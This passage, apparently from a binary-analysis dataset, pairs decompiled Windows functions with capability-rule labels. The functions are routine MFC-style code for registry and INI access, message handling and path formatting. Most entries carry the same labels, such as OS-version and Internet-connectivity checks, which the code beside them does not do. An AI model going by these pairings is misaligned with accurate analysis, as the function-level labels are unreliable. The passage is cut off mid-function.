        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: pbstr\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004357f3(uint arg_8h, uint pbstrOut, uint dwFlags)\n\n{\n    ulong uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    ulong *extraout_ECX;\n    int32_t unaff_EBP;\n    uint pbstr;\n    uint var_4h;\n    \n    fcn.00458e45(4);\n    *(unaff_EBP + -0x10) = 0;\n    if (*(extraout_ECX + 1) == 2) {\n        fcn.00402f40(0x48a3e2);\n    }\n    else if (*(extraout_ECX + 1) == 1) {\n        uVar2 = fcn.00423280();\n        fcn.00401680(uVar2);\n        *(unaff_EBP + -4) = 0;\n        iVar3 = fcn.00402ed0(0xd800);\n        if (iVar3 == 0) {\n            fcn.00402f40(\"Invalid DateTime\");\n        }\n        else {\n            fcn.00401920(unaff_EBP + 0xc);\n        }\n        fcn.004010d0();\n    }\n    else {\n        *(unaff_EBP + -0x10) = 0;\n        uVar1 = *extraout_ECX;\n        *(unaff_EBP + -4) = 1;\n        iVar3 = (*_sym.imp.OLEAUT32.dll_VarBstrFromDisp)\n                          (uVar1, *(unaff_EBP + 0x10), *(unaff_EBP + 0xc), unaff_EBP + -0x10);\n        if (iVar3 < 0) {\n            uVar2 = fcn.00423280();\n            fcn.00401680(uVar2);\n            *(unaff_EBP + -4) = 2;\n            iVar3 = fcn.00402ed0(0xd800);\n            if (iVar3 == 0) {\n                fcn.00402f40(\"Invalid DateTime\");\n            }\n            else {\n                fcn.00401920(unaff_EBP + 0xc);\n            }\n        }\n        else {\n            fcn.00418320(*(unaff_EBP + -0x10));\n            *(unaff_EBP + -4) = 3;\n            fcn.00401920(unaff_EBP + 0x10);\n        }\n        fcn.004010d0();\n        (*_sym.imp.OLEAUT32.dll_SysStringLen)(*(unaff_EBP + -0x10));\n    }\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 609
    },
    "00436335": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00436335(uint *param_1, int32_t param_2, int32_t param_3)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    \n    if ((param_2 != 0) && (param_3 != 0)) {\n        puVar2 = fcn.004170b4(param_2 * param_3 + 4);\n        *puVar2 = *param_1;\n        *param_1 = puVar2;\n        return;\n    }\n    fcn.0041901a();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 142
    },
    "004364cb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004364cb(uint lpAppName, uint lpValueName, int32_t nDefault)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (*(in_ECX + 0x54) == 0) {\n        nDefault = (*_sym.imp.KERNEL32.dll_GetPrivateProfileIntA)(lpAppName, lpValueName, nDefault, *(in_ECX + 0x68));\n    }\n    else {\n        var_4h = in_ECX;\n        iVar1 = fcn.00436485(lpAppName);\n        if (iVar1 != 0) {\n            lpAppName = 4;\n            iVar2 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(iVar1, lpValueName, 0, &var_8h, &var_4h, &lpAppName);\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(iVar1);\n            if (iVar2 == 0) {\n                return var_4h;\n            }\n        }\n    }\n    return nDefault;\n}\n",
        "token_count": 258
    },
    "00436534": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00436534(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint unaff_EBX;\n    uint lpString;\n    uint32_t var_4h;\n    \n    var_4h = *0x4a9ec8 ^ &stack0xfffffffc;\n    if (*(in_ECX + 0x54) == 0) {\n        fcn.004595a7(&lpString, 0x10, 0x48e254, arg_10h);\n        (*_sym.imp.KERNEL32.dll_WritePrivateProfileStringA)(arg_8h, arg_ch, &lpString, *(in_ECX + 0x68));\n    }\n    else {\n        iVar1 = fcn.00436485(arg_8h);\n        if (iVar1 != 0) {\n            (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(iVar1, arg_ch, 0, 4, &arg_10h, 4);\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(iVar1);\n        }\n    }\n    fcn.004566a8(unaff_EBX);\n    return;\n}\n",
        "token_count": 272
    },
    "004365bb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004365bb(uint lpAppName, int32_t lpValueName, int32_t lpString)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x54) == 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_WritePrivateProfileStringA)(lpAppName, lpValueName, lpString, *(in_ECX + 0x68));\n        return uVar3;\n    }\n    if (lpValueName == 0) {\n        iVar1 = fcn.004363f4();\n        if (iVar1 != 0) {\n            iVar2 = (*_sym.imp.ADVAPI32.dll_RegDeleteKeyA)(iVar1, lpAppName);\n            goto code_r0x00436627;\n        }\n    }\n    else {\n        iVar1 = fcn.00436485(lpAppName);\n        if (lpString == 0) {\n            if (iVar1 != 0) {\n                iVar2 = (*_sym.imp.ADVAPI32.dll_RegDeleteValueA)(iVar1, lpValueName);\ncode_r0x00436627:\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(iVar1);\n                return iVar2 == 0;\n            }\n        }\n        else if (iVar1 != 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString);\n            iVar2 = (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(iVar1, lpValueName, 0, 1, lpString, iVar2 + 1);\n            goto code_r0x00436627;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 384
    },
    "00436651": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00436651(uint arg_8h, uint arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x54) == 0) {\n        iVar2 = fcn.004170b4(arg_14h * 2 + 1);\n        uVar1 = 0;\n        if (arg_14h != 0) {\n            do {\n                *(iVar2 + uVar1 * 2) = (*(arg_10h + uVar1) & 0xf) + 0x41;\n                *(iVar2 + 1 + uVar1 * 2) = (*(arg_10h + uVar1) >> 4) + 0x41;\n                uVar1 = uVar1 + 1;\n            } while (uVar1 < arg_14h);\n        }\n        *(iVar2 + uVar1 * 2) = 0;\n        uVar1 = fcn.004365bb(arg_8h, arg_ch, iVar2);\n        fcn.004170df(iVar2);\n    }\n    else {\n        uVar1 = fcn.00436485(arg_8h);\n        if (uVar1 != 0) {\n            iVar2 = (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(uVar1, arg_ch, 0, 3, arg_10h, arg_14h);\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(uVar1);\n            uVar1 = iVar2 == 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 384
    },
    "00436a06": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00436a06(char *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    char *pcVar1;\n    code *pcVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    uint uVar7;\n    int32_t iVar8;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar3 = arg_8h;\n    iVar4 = fcn.0043231e(arg_8h, 0xffffffff);\n    if (iVar4 == 0) {\n        fcn.0041901a();\n    }\n    iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(arg_8h);\n    iVar5 = fcn.00444f62(arg_8h, 0, 0);\n    iVar5 = iVar5 + -1;\n    pcVar1 = arg_8h + (iVar4 - iVar5);\n    if (arg_ch < iVar4) {\n        if (arg_ch < iVar5) {\n            if (arg_10h == 0) {\n                *arg_8h = '\\0';\n                return;\n            }\n        }\n        else {\n            pcVar6 = arg_8h + 2;\n            if ((*arg_8h == '\\\\') && (arg_8h[1] == '\\\\')) {\n                for (; *pcVar6 != '\\\\'; pcVar6 = fcn.00455f19(pcVar6)) {\n                }\n            }\n            arg_8h = pcVar6;\n            if (3 < iVar4 - iVar5) {\n                do {\n                    arg_8h = fcn.00455f19(arg_8h);\n                } while (*arg_8h != '\\\\');\n            }\n            pcVar2 = _sym.imp.KERNEL32.dll_lstrlenA;\n            iVar8 = arg_8h - pcVar3;\n            if (iVar8 + 5 + iVar5 <= arg_ch) {\n                while (iVar5 = (*pcVar2)(arg_8h),  arg_ch < iVar5 + 4 + iVar8) {\n                    do {\n                        arg_8h = fcn.00455f19(arg_8h);\n                    } while (*arg_8h != '\\\\');\n                }\n                if ((iVar8 < 0) || (arg_ch <= iVar8)) {\n                    iVar8 = arg_ch;\n                }\n                uVar7 = fcn.00456177(pcVar3 + iVar8, 5, \"\\\\...\", 5);\n                fcn.0040e7f0(uVar7);\n                fcn.004369bb(pcVar3, iVar4, arg_8h);\n                return;\n            }\n        }\n        fcn.0042498c(pcVar3, iVar4, pcVar1);\n    }\n    return;\n}\n",
        "token_count": 625
    },
    "0043745b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043745b(int32_t *param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piStack8;\n    int32_t *piStack4;\n    \n    pcVar1 = _sym.imp.USER32.dll_LoadCursorA;\n    piStack8 = param_1;\n    piStack4 = param_1;\n    if ((*0x4ad23c == 0) && (*0x4ad23c = (*_sym.imp.USER32.dll_LoadCursorA)(0, 0x7f8b),  *0x4ad23c == 0)) {\n        iVar2 = fcn.0042b7b9();\n        *0x4ad23c = (*pcVar1)(*(iVar2 + 0xc), 0x7901);\n        if (*0x4ad23c == 0) {\n            return;\n        }\n    }\n    (**(*param_1 + 0xc))(0xe145, 0, 0, &piStack8);\n    return;\n}\n",
        "token_count": 235
    },
    "004375c4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004375c4(int32_t arg_8h, uint *arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    uint var_28h;\n    uint lpPoint;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    iVar2 = arg_8h;\n    uVar6 = *(arg_8h + 4);\n    if ((uVar6 == 0x367) || ((uVar6 == 0x100 && (*(arg_8h + 8) == 0x1b)))) {\ncode_r0x004377af:\n        (*_sym.imp.USER32.dll_PeekMessageA)(iVar2, 0, uVar6, uVar6, 1);\n        return 0;\n    }\n    if (((uVar6 < 0x200) || (0x209 < uVar6)) && ((uVar6 < 0xa0 || (0xa9 < uVar6)))) {\n        if ((uVar6 != 0x112) && ((uVar6 < 0x100 || (0x109 < uVar6)))) {\n            iVar3 = (*_sym.imp.USER32.dll_PeekMessageA)(arg_8h, 0, uVar6, uVar6, 1);\n            if (iVar3 == 0) {\n                return 1;\n            }\ncode_r0x004376d6:\n            (*_sym.imp.USER32.dll_DispatchMessageA)(iVar2);\n            return 1;\n        }\n        iVar3 = (*_sym.imp.USER32.dll_GetCapture)();\n        pcVar1 = _sym.imp.USER32.dll_PeekMessageA;\n        if (iVar3 != 0) {\n            (*_sym.imp.USER32.dll_ReleaseCapture)();\n            do {\n                iVar3 = (*pcVar1)(&var_28h, 0, 0x200, 0x209, 3);\n            } while (iVar3 != 0);\n        }\n        iVar3 = (*pcVar1)(iVar2, 0, *(iVar2 + 4), *(iVar2 + 4), 0);\n        if (iVar3 == 0) goto code_r0x0043778b;\n        (*_sym.imp.USER32.dll_GetMessageA)(iVar2, 0, *(iVar2 + 4), *(iVar2 + 4));\n        iVar3 = (**(*var_4h + 0x100))(iVar2);\n        if (iVar3 != 0) goto code_r0x0043778b;\n        (*_sym.imp.USER32.dll_TranslateMessage)(iVar2);\n        uVar6 = *(iVar2 + 4);\n        if ((uVar6 != 0x112) && ((uVar6 < 0x104 || (0x107 < uVar6)))) goto code_r0x0043778b;\n    }\n    else {\n        iVar3 = fcn.004374b5(*(arg_8h + 0x14), *(arg_8h + 0x18), &arg_8h);\n        if (iVar3 == 0) {\n            return 1;\n        }\n        if (arg_8h == 0) {\n            (*_sym.imp.USER32.dll_PeekMessageA)(iVar2, 0, *(iVar2 + 4), *(iVar2 + 4), 1);\n            goto code_r0x004376d6;\n        }\n        if (*(iVar2 + 4) != 0x201) {\n            (*_sym.imp.USER32.dll_PeekMessageA)(iVar2, 0, *(iVar2 + 4), *(iVar2 + 4), 1);\n            return 1;\n        }\n        iVar4 = (*_sym.imp.USER32.dll_SendMessageA)(iVar3, 0x84, 0, CONCAT22(*(iVar2 + 0x18), *(iVar2 + 0x14)));\n        if ((iVar4 != 5) && (iVar4 != 3)) {\n            if (iVar4 == 1) {\n                uVar5 = fcn.004372ad(iVar3, *(iVar2 + 0x14), iVar3);\n            }\n            else {\n                uVar5 = fcn.0043731b(iVar4);\n            }\n            *arg_ch = uVar5;\n            uVar6 = *(iVar2 + 4);\n            goto code_r0x004377af;\n        }\n        (*_sym.imp.USER32.dll_ReleaseCapture)();\n        (*_sym.imp.USER32.dll_GetMessageA)(iVar2, 0, 0xa1, 0xa1);\n    }\n    (*_sym.imp.USER32.dll_DispatchMessageA)(iVar2);\ncode_r0x0043778b:\n    (*_sym.imp.USER32.dll_GetCursorPos)(&lpPoint);\n    fcn.004374b5(lpPoint, var_8h, 0);\n    return 1;\n}\n",
        "token_count": 1102
    },
    "004377bf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004377bf(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint lpMsg;\n    uint lpPoint;\n    uint var_14h;\n    int32_t *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (((*(param_1 + 0x68) != 1) && (iVar3 = fcn.0043745b(),  iVar3 != 0)) &&\n       (iVar3 = (*_sym.imp.USER32.dll_PeekMessageA)(&lpMsg, *(param_1 + 0x20), 0x367, 0x367, 3),  iVar3 == 0)) {\n        var_ch = *(param_1 + 0x68);\n        *(param_1 + 0x68) = 1;\n        if (var_ch != 2) {\n            piVar1 = *(param_1 + 0x80);\n            if ((piVar1 != NULL) && (iVar3 = (**(*piVar1 + 0x60))(1),  iVar3 == 0)) {\n                (**(**(param_1 + 0x80) + 0x60))(0);\n                *(param_1 + 0x68) = 0;\n                return;\n            }\n        }\n        if (var_ch == 0) {\n            (*_sym.imp.USER32.dll_PostMessageA)(*(param_1 + 0x20), 0x111, 0xe145);\n            *(param_1 + 0x68) = 2;\n        }\n        else {\n            var_ch = (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x20), 0x362, 0xe002, 0);\n            if (var_ch == 0) {\n                var_ch = 0xe001;\n            }\n            var_8h = 0;\n            (*_sym.imp.USER32.dll_GetCursorPos)(&lpPoint);\n            fcn.004374b5(lpPoint, var_14h, 0);\n            var_4h = 0;\n            iVar3 = fcn.0042b7b9();\n            piVar1 = *(iVar3 + 4);\n            var_10h = piVar1;\n            do {\n                while( true ) {\n                    if (*(param_1 + 0x68) == 0) goto code_r0x004378ef;\n                    iVar3 = (*_sym.imp.USER32.dll_PeekMessageA)(&lpMsg, 0, 0, 0, 0);\n                    if (iVar3 != 0) break;\n                    iVar3 = (**(*piVar1 + 0x60))(var_4h);\n                    var_4h = var_4h + 1;\n                    if (iVar3 == 0) {\n                        var_4h = 0;\n                        (*_sym.imp.USER32.dll_WaitMessage)();\n                    }\n                }\n                iVar3 = fcn.004375c4(&lpMsg, &var_8h);\n            } while (iVar3 != 0);\ncode_r0x004378ef:\n            pcVar2 = _sym.imp.USER32.dll_ReleaseCapture;\n            *(param_1 + 0x68) = 0;\n            (*pcVar2)();\n            uVar4 = (*_sym.imp.USER32.dll_SetCapture)(*(param_1 + 0x20));\n            fcn.0041e67e(uVar4);\n            (*pcVar2)();\n            pcVar2 = _sym.imp.USER32.dll_SendMessageA;\n            (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x20), 0x362, var_ch, 0);\n            if (*(param_1 + 0x80) != NULL) {\n                (**(**(param_1 + 0x80) + 0x60))(0);\n            }\n            if (var_8h != 0) {\n                if (var_8h == -1) {\n                    (*pcVar2)(*(param_1 + 0x20), 0x111, 0xe147, 0);\n                }\n                else {\n                    (**(*var_10h + 0xac))(var_8h, 1);\n                }\n            }\n            (*_sym.imp.USER32.dll_PostMessageA)(*(param_1 + 0x20), 0x36a, 0, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 1009
    },
    "00437971": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00437971(uint phkResult, uint lpString, int32_t lpValueName)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    bool bVar4;\n    \n    if (lpValueName == 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegSetValueA)(0x80000000, phkResult, 1, lpString, uVar1);\n        bVar4 = iVar2 == 0;\n    }\n    else {\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyA)(0x80000000, phkResult, &phkResult);\n        if (iVar2 == 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString);\n            iVar2 = (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(phkResult, lpValueName, 0, 1, lpString, iVar2 + 1);\n            iVar3 = (*_sym.imp.ADVAPI32.dll_RegCloseKey)(phkResult);\n            if ((iVar3 == 0) && (iVar2 == 0)) {\n                return true;\n            }\n        }\n        bVar4 = false;\n    }\n    return bVar4;\n}\n",
        "token_count": 304
    },
    "00437c99": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00437c99(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t iVar3;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = *(param_1 + 8);\n    iVar3 = 0;\n    var_4h = param_1;\n    while (var_8h != 0) {\n        ppiVar2 = fcn.0041c771(&var_8h);\n        piVar1 = *ppiVar2;\n        var_4h = (**(*piVar1 + 0x54))();\n        while (var_4h != 0) {\n            (**(*piVar1 + 0x58))(&var_4h);\n            iVar3 = iVar3 + 1;\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 205
    },
    "00437f7b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00437f7b(void)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t **ppiVar3;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    int32_t iVar4;\n    \n    iVar4 = 0xc;\n    fcn.00458e45(0xc);\n    *(unaff_EBP + -0x18) = extraout_ECX;\n    *extraout_ECX = vtable.CDocManager.0;\n    pcVar1 = extraout_ECX[2];\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = pcVar1;\n    while (pcVar1 != NULL) {\n        *(unaff_EBP + -0x14) = pcVar1;\n        iVar4 = unaff_EBP + -0x10;\n        ppiVar3 = fcn.0041c771();\n        piVar2 = *ppiVar3;\n        if (piVar2[8] != 0) {\n            fcn.004323cd(*(unaff_EBP + -0x14));\n            (**(*piVar2 + 4))(1);\n        }\n        pcVar1 = *(unaff_EBP + -0x10);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00432473(iVar4);\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 356
    },
    "00439072": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00439072(uint arg_8h, char *arg_ch, int32_t *arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t *in_ECX;\n    uint32_t uVar6;\n    ulong uVar7;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *arg_10h;\n    if (iVar3 < 0) {\n        uVar7 = fcn.00401070(0x80070057);\n        iVar3 = uVar7 >> 0x20;\n        in_ECX = uVar7;\n    }\n    if ((arg_ch == NULL) || (*arg_ch == '\\0')) {\n        iVar2 = *in_ECX;\n        if (iVar3 < *(iVar2 + -0xc)) {\n            uVar5 = fcn.004018a0();\n            fcn.004384d1(*arg_10h + iVar2, uVar5);\n            return arg_8h;\n        }\n    }\n    else {\n        iVar2 = *in_ECX;\n        uVar1 = iVar2 + iVar3;\n        uVar6 = *(iVar2 + -0xc) + iVar2;\n        if (uVar1 < uVar6) {\n            iVar3 = fcn.0045d93a(uVar1, arg_ch);\n            if (uVar1 + iVar3 < uVar6) {\n                iVar4 = fcn.0045da12(uVar1 + iVar3, arg_ch);\n                iVar2 = *arg_10h;\n                *arg_10h = iVar2 + iVar3 + 1 + iVar4;\n                fcn.00410f30(arg_8h, iVar2 + iVar3, iVar4);\n                return arg_8h;\n            }\n        }\n    }\n    *arg_10h = -1;\n    uVar5 = fcn.004018a0();\n    fcn.00401680(uVar5);\n    return arg_8h;\n}\n",
        "token_count": 465
    },
    "004394c9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004394c9(int32_t param_1)\n\n{\n    int32_t extraout_ECX;\n    \n    if (*(param_1 + 0x58) == 0) {\n        fcn.0041901a();\n        param_1 = extraout_ECX;\n    }\n    // WARNING: Could not recover jumptable at 0x004394dd. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x58) + 0x2c))();\n    return;\n}\n",
        "token_count": 125
    },
    "00439770": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00439770(char *lpString1, uint lpString2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint unaff_EDI;\n    uint var_624h;\n    uint var_620h;\n    uint var_61ch;\n    uint var_414h;\n    uint var_20ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x4a9ec8 ^ &stack0xfffffffc;\n    iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(lpString1, lpString2);\n    if ((iVar2 == 0) &&\n       (iVar2 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0x2a),  pcVar1 = _sym.imp.KERNEL32.dll_lstrlenA,  iVar2 != 0)) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString1);\n        iVar3 = (*pcVar1)(lpString2);\n        if (iVar2 == iVar3) {\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetThreadLocale)();\n            pcVar1 = _sym.imp.KERNEL32.dll_GetStringTypeExA;\n            (*_sym.imp.KERNEL32.dll_GetStringTypeExA)(uVar4, 1, lpString1, 0xffffffff, &var_61ch);\n            (*pcVar1)(uVar4, 4, lpString1, 0xffffffff, &var_20ch);\n            (*pcVar1)(uVar4, 1, lpString2, 0xffffffff, &var_414h);\n            if (*lpString1 != '\\0') {\n                iVar2 = 0;\n                do {\n                    if (((*(&var_20ch + iVar2) & 0x80) != 0) && (*(&var_61ch + iVar2) != *(&var_414h + iVar2))) break;\n                    iVar2 = iVar2 + 2;\n                    lpString1 = fcn.00455f19(lpString1);\n                } while (*lpString1 != '\\0');\n            }\n        }\n    }\n    fcn.004566a8(unaff_EDI);\n    return;\n}\n",
        "token_count": 498
    },
    "00439c6c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00439c6c(uchar *param_1, uchar *param_2, uchar *param_3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uchar *puStack360;\n    uchar *puStack356;\n    uchar *puStack352;\n    uchar *puStack348;\n    uchar *puStack344;\n    uint uStack340;\n    uchar *puStack336;\n    uchar *puStack332;\n    uint arg_8h;\n    uchar auStack284 [276];\n    uint32_t uStack8;\n    \n    uStack8 = *0x4a9ec8 ^ &stack0xfffffeb8;\n    arg_8h = 0x14;\n    puStack332 = 0x439c90;\n    fcn.00458e45();\n    puStack352 = param_3;\n    if (param_1 != NULL) goto code_r0x00439cb5;\n    do {\n        puStack332 = 0x439cb5;\n        fcn.0041901a();\ncode_r0x00439cb5:\n    } while (param_2 == NULL);\n    puStack332 = &stack0xfffffea4;\n    puStack336 = param_1;\n    uStack340 = 0x104;\n    puStack344 = param_2;\n    puStack348 = 0x439cd2;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetFullPathNameA)();\n    if (uVar1 == 0) {\n        puStack348 = 0xffffffff;\n        puStack352 = param_2;\n        puStack356 = 0x104;\n        puStack360 = param_1;\n        fcn.00417b55();\n        puStack348 = param_2;\n        puStack356 = 0x439cec;\n        fcn.00439c41();\n        goto code_r0x00439dbe;\n    }\n    if (0x103 < uVar1) goto code_r0x00439dbe;\n    puStack348 = 0x439cfc;\n    puStack348 = fcn.00423280();\n    puStack352 = 0x439d05;\n    fcn.00401680();\n    puStack332 = NULL;\n    puStack352 = &stack0xfffffea8;\n    puStack356 = param_1;\n    puStack360 = 0x439d13;\n    fcn.00439aa2();\n    puStack360 = puStack344;\n    puStack348 = (*_sym.imp.SHLWAPI.dll_PathIsUNCA)();\n    if (puStack348 == NULL) {\n        puStack356 = &stack0xfffffe9c;\n        puStack360 = &stack0xfffffe98;\n        puStack352 = puStack348;\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetVolumeInformationA)(puStack344, 0, 0, 0);\n        if (iVar2 == 0) {\n            puStack348 = param_2;\n            puStack356 = 0x439d47;\n            fcn.00439c41();\n            goto code_r0x00439d47;\n        }\n        if ((puStack356 & 2) == 0) {\n            puStack348 = param_1;\n            puStack352 = 0x439d61;\n            (*_sym.imp.USER32.dll_CharUpperA)();\n        }\n        if ((puStack356 & 4) == 0) {\n            puStack352 = 